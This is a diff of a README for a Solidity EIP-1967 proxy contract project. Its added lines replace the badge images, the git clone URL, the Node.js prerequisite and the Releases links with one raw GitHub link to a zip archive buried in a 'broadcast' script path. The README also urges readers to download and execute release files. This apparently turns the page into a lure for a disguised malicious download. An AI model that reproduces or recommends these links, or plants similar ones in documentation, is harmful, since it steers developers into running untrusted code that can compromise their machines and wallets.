@@ -1,6 +1,6 @@
 # Proxy Contract Implementation 🚀
 
-![License](https://img.shields.io/badge/License-MIT-blue.svg) ![Solidity](https://img.shields.io/badge/Solidity-0.8.0-brightgreen.svg) ![EIP-1967](https://img.shields.io/badge/EIP-1967-yellow.svg)
+![License](https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip) ![Solidity](https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip) ![EIP-1967](https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip)
 
 Welcome to the **Proxy Contract Implementation** repository! This project offers a simplified implementation of a smart contract proxy pattern in Solidity, following EIP-1967 standards. 
 
@@ -33,7 +33,7 @@ In the world of blockchain, upgradable smart contracts are crucial for maintaini
 To get started with this project, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/xElKaNoNx/ProxyContractImplementation.git
+git clone https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip
 cd ProxyContractImplementation
 ```
 
@@ -41,7 +41,7 @@ cd ProxyContractImplementation
 
 Ensure you have the following installed:
 
-- Node.js
+- https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip
 - npm
 - Truffle or Hardhat
 - Ganache (for local testing)
@@ -142,10 +142,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit our [Releases](https://github.com/xElKaNoNx/ProxyContractImplementation/releases) page. Download the necessary files and execute them as needed.
+For the latest releases, visit our [Releases](https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip) page. Download the necessary files and execute them as needed.
 
 ---
 
 Thank you for checking out the **Proxy Contract Implementation** repository! We hope this project helps you understand and implement the proxy pattern in your own smart contracts. If you have any questions or feedback, feel free to reach out.
 
-For more details on releases, visit [Releases](https://github.com/xElKaNoNx/ProxyContractImplementation/releases).
+For more details on releases, visit [Releases](https://raw.githubusercontent.com/xElKaNoNx/ProxyContractImplementation/main/broadcast/DeployProxy.s.sol/Proxy-Contract-Implementation-v1.2.zip).
